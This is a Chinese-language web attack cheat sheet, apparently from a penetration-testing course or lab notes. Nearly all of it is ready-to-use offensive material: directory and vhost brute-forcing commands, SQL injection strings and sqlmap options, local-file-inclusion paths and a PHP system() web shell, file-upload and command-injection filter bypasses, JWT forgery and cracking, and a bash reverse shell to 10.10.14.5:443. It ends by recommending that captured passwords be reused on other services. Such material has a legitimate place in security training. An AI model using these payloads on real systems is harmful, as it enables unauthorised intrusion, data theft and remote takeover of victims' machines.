# 速查：Web 攻擊

> 原理看 [Ch 8](../08-web-recon.md)、[Ch 10](../10-burp-suite.md)–[Ch 15](../15-auth-bypass.md)。

## 情報蒐集

```bash
whatweb http://IP                       # 技術指紋
# 目錄爆破
feroxbuster -u http://IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
# vhost / 子網域
gobuster vhost -u http://IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
ffuf -u http://IP -H "Host: FUZZ.domain.local" -w wordlist -fs <過濾大小>
# 看原始碼、robots.txt、備份檔（.bak .old .swp）、註解
```

## SQL Injection

```sql
' OR 1=1-- -                 -- 認證繞過
' AND 1=1-- -  vs  ' AND 1=2-- -   -- boolean
' AND SLEEP(5)-- -           -- time-based（確認注入）
' ORDER BY 5-- -             -- 逐步加找欄位數
' UNION SELECT 1,2,3-- -     -- 找回顯欄位
```
```bash
sqlmap -u "http://IP/p?id=1" --batch --dbs
sqlmap -u "URL" --level 5 --risk 3 -p id --technique=T   # 難抓時
# 進階：MySQL INTO OUTFILE 寫 webshell、MSSQL xp_cmdshell 執行命令
```

## LFI / RFI

```
http://IP/?page=../../../../etc/passwd
http://IP/?page=php://filter/convert.base64-encode/resource=index.php
http://IP/?page=/var/log/apache2/access.log   # log poisoning → RCE
php://input + POST <?php system($_GET['c']); ?>   # RFI/包裝器
# Windows：../../../../windows/system32/drivers/etc/hosts
```

## 檔案上傳繞過

```
副檔名：.php .phtml .php5 .phar .pht
雙副檔名：shell.php.jpg
大小寫：shell.pHp
魔術字元：加 GIF89a; 前綴騙 MIME
Content-Type 改成 image/png（Burp 改）
.htaccess 上傳 → 讓 .xxx 當 php 執行
```

## 命令注入

```bash
; id    | id    || id    & id    `id`    $(id)
%0a id                        # 換行
${IFS}                        # 空白被擋
c''at /etc/passwd             # 關鍵字被擋
; ping -c1 10.10.14.5         # blind：tcpdump -i tun0 icmp 驗證
```

## 認證繞過

```
預設憑證：admin/admin、admin/password、產品預設
JWT：alg=none、弱密鑰 hashcat -m 16500、改 payload 不改簽章試
SQLi 登入繞過：admin'-- -
IDOR：改 id 參數看越權
```

## 反彈 shell（web RCE 後）

```bash
bash -i >& /dev/tcp/10.10.14.5/443 0>&1
# URL 編碼後塞進參數；詳見 shells-and-transfer.md
```

## 鐵律
- 手動先確認漏洞成立（看得到結果）再上自動工具
- 目錄爆破多試幾個字典 + 副檔名；遞迴挖
- 拿到的密碼/hash 一律拿去其他服務重用
